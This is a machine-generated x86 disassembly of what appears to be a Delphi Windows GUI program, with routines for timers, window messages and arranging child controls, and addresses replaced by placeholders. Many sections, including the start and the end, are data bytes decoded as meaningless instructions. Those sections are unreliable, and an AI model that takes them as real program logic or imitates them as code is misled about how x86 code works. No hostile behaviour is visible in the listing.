add [ eax ] al
add [ eax + ebp ] cl
dec eax
add [ eax ] dh
cmp [ eax ] cl
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42da7e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
dec eax
add [ ecx + edi ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + ebp + 0x48 ] ch
add [ ebp + esi + 0x48 ] dl
add [ eax ] al
push 0x88004828
cmp cl [ eax ]
add [ eax ] al
add [ eax ] al
sub [ fs : eax ] cl
sub al 0x39
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42da85
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404c00
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_42da88
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403eb4
call sub_42d8d8
mov eax [ r-xdata ]
call sub_417ed4
mov eax [ r-xdata ]
call sub_417f74
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f20
sub_42db7d
cmp ch ah
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
je r-xdata
inc eax
add [ eax ] dh
add [ eax ] al
dec [ eax - 0x1b ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ ecx + ebp * 8 ] dh
inc edx
add ah cl
add al [ ebp ]
hlt
jb r-xdata
inc esp
add [ esi + ecx * 4 - 0x146fffbf ] dh
inc edx
add [ esp + eax * 4 + 0x44 ] bl
add [ ebx + ebp * 8 - 0x7263ffbe ] ah
inc esp
add [ ecx + ebx ] cl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add [ eax + ebp * 8 - 0x21fffbe ] ah
inc esp
add ah bh
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ eax + edi * 8 + 0x44 ] bh
add [ ebp + esi * 8 - 0x7de7ffbc ] dl
inc esp
add [ edx + eax * 4 ] bl
inc esp
add [ eax - 0x4e ] bl
inc esp
add [ edx + esi * 4 - 0x727bffbc ] al
inc esp
add [ ebx + eax * 4 - 0x70efffbc ] dl
inc esp
add [ eax - 0x63ffbb72 ] cl
xchg ecx eax
inc esp
add [ eax - 0x70 ] cl
inc esp
add al cl
rol [ eax + eax + 0x8 ] 0x1
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax - 0x57ffbb0a ] cl
inc ebx
add [ esi + edi * 4 - 0x33abffbc ] dh
inc esp
add [ ebx + esi * 8 ] al
inc ebx
add [ ecx + ecx * 8 ] bh
inc esp
add [ edi + eax * 8 + 0x44 ] ch
add ah ch
int3
popad
insb
inc esp
pop edx
inc ecx
add [ eax ] bh
add [ eax ] al
[ eax - 0x1b ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x42dc2872
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
fld [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
fadd [ edx ]
sbb ch bl
inc edx
add [ edx + eax ] ah
add [ eax ] al
inc eax
mov eax 0x18f40043
inc edx
add [ ebp + esi + 0x12480040 ] ah
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
inc esp
sub_42de66
inc esp
add [ edi + esi * 8 ] dh
inc esp
add [ ebx + esi * 8 ] dl
inc ebx
add [ esi + ebp * 8 ] cl
inc edx
add [ ebx ] cl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
test dh bl
inc edx
add [ edi ] al
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
movsb [ edi ] [ esi ]
fld [ edx ]
sub al 0xdd
inc edx
add [ edi ] ch
add [ eax ] cl
inc ebp
js r-xdata
in al 0x8f
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
xor ah 0xff
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
scasd [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
pop [ eax + eax - 0x38 ]
insb
jae r-xdata
add bh bh
push esp
xchg ecx eax
inc esp
add [ eax - 0x6f ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
add [ ecx ] ah
add bh bh
loopne r-xdata
add [ eax ] dl
cmp eax [ eax + eax + 0x5b ]
add [ eax ] al
jmp [ eax + 0x1004484 ]
inc ebx
adc [ eax ] al
sbb al 0x2
add bh bh
or ah ch
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc esp
add [ eax - 0x35 ] dl
inc esp
add [ ebx + eax * 4 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ gs : eax ] dl
xor eax [ eax + edi * 8 + 0x3a ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
cld
pop eax
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
je r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
push esp
clc
inc esp
add [ eax ] bl
stc
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
inc esp
add al cl
add dh bh
fcom [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
or eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0x41e06564
inc esp
add [ edi + ecx * 4 - 0x701bffbc ] dh
[ eax - 0x47ffbb70 ]
jae r-xdata
add bh bh
test al 0x90
inc esp
add [ eax + 0x4490 ] bh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ 0x6d657449 ] al
adc [ eax ] al
sbb [ edx ] al
add bh bh
inc eax
in al dx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
jb r-xdata
outsd
insb
outsd
inc ecx
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050018 ] al
je r-xdata
inc edx
inc esp
add [ eax + eax ] dh
jmp [ eax + 0x10044b4 ]
add [ eax ] eax
jae r-xdata
insd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
outsb
je r-xdata
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500b00
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
push eax
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
outsb
je r-xdata
je r-xdata
jne r-xdata
aam 0x8e
inc esp
add [ eax - 0x50 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x44656c62
pop edx
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
jo r-xdata
adc [ eax ] al
0x28ff0000 0x4491
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
js r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
outsb
je r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
loopne r-xdata
add [ eax ] al
sbb [ ecx ] 0x0
or eax [ ebx + 0x6f ]
outsb
jae r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
inc [ ecx + edx * 4 ]
inc esp
add ah cl
nop
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080021 ] al
push 0x6948776f
outsb
je r-xdata
stc
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
sbb eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
add [ eax ] al
add [ ecx ] 0x0
inc esp
add [ ecx ] al
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ esi ] cl
outsb
je r-xdata
inc esp
add al dl
stc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc ecx
inc esp
add [ eax - 0x7 ] dl
inc ebx
add [ ebp ] 0x7c
add [ eax ] al
[ edi + ecx * 4 + 0x44 ]
xchg ecx eax
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
adc [ eax ] al
test eax 0x24ff0001
stc
sbb al 0x0
add [ eax ] al
add [ eax + 0x1 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
xchg esp eax
or [ ebp ] eax
mov esp 0x1fe0000
add [ eax ] al
add [ eax ] al
sub_42e400
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42e4ac
mov eax [ esi + 0x34 ]
call sub_422384
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4211d0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_42e438
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42e472
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e4ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42e52b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e532
lea eax [ ebp - 0x4 ]
call sub_404164
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
sub_42e588
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x42e6 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffb40042e6 ]
out 0x42 al
add [ edx + eax ] bl
add [ eax ] al
dec esp
loop r-xdata
inc edx
add ah ch
adc eax 0x19140042
inc edx
add [ ebx ] bl
inc esp
add al ah
std
inc esp
add ah bh
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ eax + edi * 8 + 0x44 ] bh
add [ ebp + esi * 8 - 0x7de7ffbc ] dl
inc esp
add [ edx + eax * 4 ] bl
inc esp
add [ eax - 0x4e ] bl
inc esp
add [ edx + esi * 4 - 0x727bffbc ] al
inc esp
add [ ebx + eax * 4 - 0x70efffbc ] dl
inc esp
add [ eax - 0x63ffbb72 ] cl
xchg ecx eax
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ eax + 0x800441e ] bh
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax + 0x200044f6 ] cl
mov eax 0xbeb40044
inc esp
add [ esp + ecx * 8 + 0x44 ] dl
add [ 0xffffffffc93c0044 ] cl
inc esp
add [ ebp + 0x44 ] ah
add ah ch
int3
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0x19 ] dh
inc edx
add ah cl
add al [ ebp ]
hlt
sub_42e6ec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_44231c
mov edx edi
mov eax [ esi + 0x210 ]
call sub_418744
xor edx edx
mov eax edi
call sub_448ed4
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_449128
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_42eb1c
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_42e770
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_418a3c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b604
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_42e7a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_42e80d
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44261c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_42e812
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_468b5c
call sub_403b98
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e838
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_44e798
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403564
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_42e878
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_44e5e0
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403564
pop edx
pop esi
pop ebx
retn
sub_42e8a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43f24c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_42eb54
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_42e934
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42ebc8
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403368
mov eax [ esi + 0x210 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_451474
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_42e984
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_4241ec
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42eb0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_44f7b4
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_448ed4
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_4489b8
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_4188a0
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403564
test al al
je r-xdata
sub_42eb1c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_4188fc
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_448bc0
mov eax ebx
mov si 0xffeb
call sub_403564
sub_42eb54
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_42eccc
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_42ebc8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e6ec
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_418988
call sub_403368
pop edi
pop esi
pop ebx
retn
sub_42ec08
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_42e984
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ec40
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_4188a0
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4188a0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_42eccc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42ed95
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_42ebc8
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_42e984
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ed9c
lea eax [ ebp - 0x8 ]
call sub_404164
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_4188a0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_4188a0
pop edx
call sub_448fe4
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_42eda4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44eca0
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4188a0
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_42ee18
inc esi
dec eax
add [ eax ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
inc esi
dec eax
add [ 0x640000ff ] ah
inc esi
dec eax
add [ esi ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
inc esi
dec eax
add [ 0x640000ff ] ch
inc esi
dec eax
add [ esi ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
inc esi
dec eax
add [ 0x640000ff ] dl
inc esi
dec eax
add [ esi ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
inc esi
dec eax
add [ 0x640000ff ] bl
inc esi
dec eax
add [ esi ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] al
inc [ eax ]
